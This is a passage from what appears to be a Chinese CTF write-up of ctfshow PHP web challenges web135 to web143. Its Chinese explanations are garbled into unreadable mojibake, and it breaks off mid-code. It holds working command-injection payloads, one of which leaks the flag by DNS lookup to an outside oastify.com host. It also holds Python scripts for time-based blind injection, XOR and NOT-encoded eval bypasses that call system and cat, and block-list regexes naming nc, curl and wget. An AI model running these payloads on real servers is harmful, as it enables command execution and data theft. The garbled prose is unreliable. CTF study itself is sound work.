é€’<code>_POST</code>ï¼Œå°±æ˜¯å¯¹<code>$_POST</code>è¿›è¡Œèµ‹å€¼ï¼Œæ­£å¥½å°±å¯ä»¥ç»•è¿‡ifæ¡ä»¶å¯¹postçš„é™åˆ¶ã€‚<br>extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p>payloadï¼š<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h4 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>é™åˆ¶äº†è®¸å¤šå‘½ä»¤ï¼Œpingå¯ä»¥ç”¨ï¼Œè¯»å–å‘½ä»¤<code>nl</code>å¯ä»¥ç”¨ã€‚<br>grepè¢«é™åˆ¶äº†ï¼Œå¯ä»¥ç”¨awkæŒ‡å®šè¡Œå·è¾“å‡ºï¼Œä¸è¿‡éœ€è¦é€è¡Œæµ‹è¯•ï¼Œåœ¨15è¡Œæœ‰flagã€‚æˆ–è€…å‚è€ƒä¹‹å‰flagçš„æ ¼å¼ï¼Œä¹Ÿå¯ä»¥æ¨æµ‹å‡ºæ¥æ˜¯15ã€‚</p><p>è¿™ä¸ªé¢˜è¿˜æŠŠflagåˆ†æˆäº†ä¸¤ä¸ªï¼Œè¡Œå·15å’Œ16ï¼Œéœ€è¦æ‹¼æ¥ä¸€ä¸‹ã€‚</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+ping <span class="token variable"><span class="token variable">`</span><span class="token function">nl</span> flag.php<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'NR==15'</span><span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.i1k4phddlneygl58oqbjxv93full9a.oastify.com</code></pre><p>å‘ç°æ–°è§£æ³•ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span>+<span class="token punctuation">;</span>cp+flag.php+1.txt</code></pre><h4 id="web136-tee"><a href="#web136-tee" class="headerlink" title="web136(tee)"></a>web136(tee)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p><code>tee</code>ç”¨äºæ˜¾ç¤ºç¨‹åºçš„è¾“å‡ºå¹¶å°†å…¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚</p><p>Payload:</p><blockquote><p>?c&#x3D;ls &#x2F;|tee 1</p><p>?c&#x3D;cat &#x2F;f149_15_h3r3|tee 1</p></blockquote><h4 id="web137-call-user-func"><a href="#web137-call-user-func" class="headerlink" title="web137(call_user_func)"></a>web137(call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><blockquote><p><a href="https://stackoverflow.com/questions/10534360/php-call-user-func-on-a-static-method">PHP call_user_func on a static method</a></p><pre class="language-none"><code class="language-none">$class &#x3D; &#39;\\MyBundleNamespace\\MyClass&#39;; $method &#x3D; &#39;myFunction&#39;;</code></pre><p>Both calls should work:</p><pre class="language-none"><code class="language-none">call_user_func(&quot;$class::$method&quot;); call_user_func(array($class, $method));</code></pre></blockquote><p>payload: <code>ctfshow=ctfshow::getFlag</code><br>payload: <code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code></p><h4 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h4><p>è¿‡æ»¤äº†::ä½†æ˜¯å¯ä»¥ç”¨æ•°ç»„</p><h4 id="web139-å‘½ä»¤ç›²æ³¨"><a href="#web139-å‘½ä»¤ç›²æ³¨" class="headerlink" title="web139(å‘½ä»¤ç›²æ³¨)"></a>web139(å‘½ä»¤ç›²æ³¨)</h4><p>ä½¿ç”¨teeå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ç›²æ³¨</p><p><strong>ls &#x2F;</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">'_~'</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#è¡Œ</span>    key<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#åˆ—</span>        <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#awk 'NR==&#123;0&#125;'é€è¡Œè¾“å‡ºè·å–</span>        <span class="token comment">#cut -c &#123;1&#125; æˆªå–å•ä¸ªå­—ç¬¦</span>            payload<span class="token operator">=</span><span class="token string">"if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>            <span class="token comment">#print(payload)</span>            url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result<span class="token operator">=</span>result<span class="token operator">+</span>n                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string">'~'</span><span class="token punctuation">:</span>                key<span class="token operator">=</span><span class="token number">1</span>                result<span class="token operator">+=</span><span class="token string">" "</span></code></pre><p><strong>cat &#x2F;f149_15_h3r3</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"-"</span>result<span class="token operator">=</span><span class="token string">""</span>key<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>n            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web140-php-intval"><a href="#web140-php-intval" class="headerlink" title="web140(php &#x3D;&#x3D;  intval)"></a>web140(php &#x3D;&#x3D;  intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$f1</span></span>(<span class="token interpolation"><span class="token variable">$f2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://blog.csdn.net/qq_47804678/article/details/128814377">phpæ¯”è¾ƒç»•è¿‡ï¼ˆå¼ºæ¯”è¾ƒâ€œ&#x3D;&#x3D;&#x3D;â€&#x2F;å¼±æ¯”è¾ƒâ€œ&#x3D;&#x3D;â€œï¼‰</a></p><p>å› ä¸ºæ˜¯<code>==</code>ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šå°†å­—ç¬¦ä¸²å…ˆè½¬åŒ–æˆæ•°å­—ç±»å‹åœ¨è¿›è¡Œæ¯”è¾ƒã€‚</p><p>å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´æ—¶ï¼Œä»¥å¼€å¤´æ•°å­—ï¼ˆåˆ°å­—æ¯å‡ºç°æˆªæ­¢ï¼‰ä½œä¸ºè½¬æ¢ç»“æœï¼›å¼€å¤´ä¸æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²æˆ–ç©ºï¼ˆnullï¼‰ï¼Œåˆ™è½¬æ¢ä¸º0ã€‚</p><blockquote><p>â€˜12â€™&#x3D;&#x3D;12    &#x2F;&#x2F;true<br>â€˜12abcâ€™&#x3D;&#x3D;12 &#x2F;&#x2F;true<br>â€˜adm2nâ€™&#x3D;&#x3D;0  &#x2F;&#x2F;true</p></blockquote><p>æ‰€ä»¥åªéœ€è¦$codeçš„å€¼ä¸ä¸º1å¼€å¤´çš„å­—ç¬¦ä¸²å³å¯ï¼Œäºæ˜¯æ„é€ è®©å…¶è¿”å›0</p><blockquote><p>intval() æˆåŠŸæ—¶ï¼Œè¿”å›å‚æ•°çš„ integer å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ã€‚ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1ã€‚<br>å­—ç¬¦ä¸²æœ‰å¯èƒ½è¿”å› 0ï¼Œå–å†³äºå­—ç¬¦ä¸²æœ€å·¦ä¾§çš„å­—ç¬¦ã€‚<br>intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚</p></blockquote><p>Payload:</p><blockquote><p>system(system())â€”&gt; f1&#x3D;system&amp;f2&#x3D;system</p><p>string system( string $command[, int &amp;$return_var] )ï¼šæˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œå¤±è´¥åˆ™è¿”å› FALSE ã€‚system()å¿…é¡»åŒ…å«å‚æ•°ï¼Œå¤±è´¥è¿”å›FLASEï¼›system(â€˜FLASEâ€™)ï¼Œç©ºæŒ‡ä»¤ï¼Œå¤±è´¥è¿”å›FLASEã€‚</p><p>usleep(usleep())â€”&gt; f1&#x3D;usleep&amp;f2&#x3D;usleep<br>usleepæ²¡æœ‰è¿”å›å€¼ã€‚ æ‰€ä»¥intvalå‚æ•°ä¸ºç©ºï¼Œå¤±è´¥è¿”å›0</p><p>getdate(getdate())â€”&gt; f1&#x3D;getdate&amp;f2&#x3D;getdate</p><p>array getdate([ int $timestamp &#x3D; time()] )ï¼šè¿”å›ç»“æœæ˜¯arrayï¼Œå‚æ•°å¿…é¡»æ˜¯intå‹ã€‚æ‰€ä»¥getdate(getdate())â€”-&gt;getdate(arrayå‹)â€”&gt;å¤±è´¥è¿”å›flaseï¼Œintvalä¸º0ã€‚</p></blockquote><h4 id="web141-å‡½æ•°ä¸æ•°å­—è¿ç®—"><a href="#web141-å‡½æ•°ä¸æ•°å­—è¿ç®—" class="headerlink" title="web141(å‡½æ•°ä¸æ•°å­—è¿ç®—)"></a>web141(å‡½æ•°ä¸æ•°å­—è¿ç®—)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>\W</strong>ï¼šä¸ä»»ä½•éå•è¯å­—ç¬¦åŒ¹é…ã€‚å°±æ˜¯é™¤äº†æ•°å­—ã€å­—æ¯ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº<code>[^A-Za-z0-9_]</code></p><p>phpé‡Œæ•°å­—å¯ä»¥å’Œå‘½ä»¤å¯ä»¥è¿›è¡Œè¿ç®—ã€‚ä¹Ÿå°±æ˜¯è¯´v3é‡Œè¦æ‰§è¡Œçš„å‡½æ•°å‰ååŠ ä¸Šè¿ç®—ç¬¦å³å¯ã€‚</p><p>ä¸¾ä¾‹ç†è§£ä¸€ä¸‹ï¼š<code>1-phpinfo()-1</code>çš„ç»“æœä¸º0ï¼Œphpinfo()æ‰§è¡ŒæˆåŠŸè¿”å›trueï¼Œ1-1-1&#x3D;-1ã€‚</p><p>åŒç†<code>system()</code>ä¹Ÿå¯æ‰§è¡Œã€‚</p><p>å–å<code>~</code>å¼‚æˆ–<code>^</code>æˆ–<code>|</code>éƒ½å¯ä»¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Payload:</p><blockquote><p>?v1&#x3D;1&amp;v2&#x3D;0&amp;v3&#x3D;%2b(â€œ%13%19%13%14%05%0dâ€|â€%60%60%60%60%60%60â€)(â€œ%03%01%14%00%06%0c%01%07%00%10%08%10â€|â€%60%60%60%20%60%60%60%60%2e%60%60%60â€)%2b</p><p>%2b&#x3D;+</p><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;-(<del>â€˜%8C%86%8C%8B%9A%92â€™)(</del>â€˜%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8Fâ€™)-</p></blockquote><h4 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p>0å’Œ0x0ç»•è¿‡ è¿™é‡Œç»•è¿‡å› ä¸ºæ˜¯å› ä¸ºå½“æˆäº†8è¿›åˆ¶å’Œ16è¿›åˆ¶</p><h4 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span 